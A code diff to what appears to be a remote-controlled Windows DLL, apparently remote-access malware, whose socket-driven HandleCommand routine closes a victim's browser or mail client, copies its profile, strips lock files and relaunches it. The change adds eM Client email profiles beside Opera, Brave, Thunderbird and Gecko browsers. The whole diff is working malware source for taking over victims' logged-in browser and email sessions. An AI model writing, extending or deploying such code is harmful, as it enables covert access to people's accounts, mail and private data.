@@ -1905,7 +1905,10 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (browserName == L"Opera" || browserName == L"Opera GX") {
+    if (browserName == L"eM Client") {
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        return wstring(szPath) + L"\\eM Client";
+    } else if (browserName == L"Opera" || browserName == L"Opera GX") {
         if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
         wstring path = szPath;
         if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
@@ -2156,7 +2159,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2182,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2186,7 +2191,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
 
                     wstring exePath;
-                    if (wRequestedPath == L"Opera") {
+                    if (wRequestedPath == L"eM Client") {
+                        exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
+                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
+                    } else if (wRequestedPath == L"Opera") {
                         wchar_t localApp[MAX_PATH] = {0};
                         SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                         exePath = wstring(localApp) + L"\\Programs\\Opera\\launcher.exe";
@@ -2336,7 +2344,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_status("Tarayıcı başlatılıyor...");
 
                     wstring args;
-                    if (isGecko) {
+                    if (wRequestedPath == L"eM Client") {
+                        if (copyProfile && !profilePath.empty()) {
+                            args = L" /dblocation \"" + profilePath + L"\"";
+                        }
+                    } else if (isGecko) {
                         args = L" -no-remote -allow-downgrade";
                         if (wRequestedPath == L"Thunderbird") {
                             args += L" -mail";
@@ -2430,7 +2442,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
-                            } else {
+                            } else if (wRequestedPath != L"eM Client") {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
                                 fs::remove(fs::path(profilePath) / L"SingletonCookie");
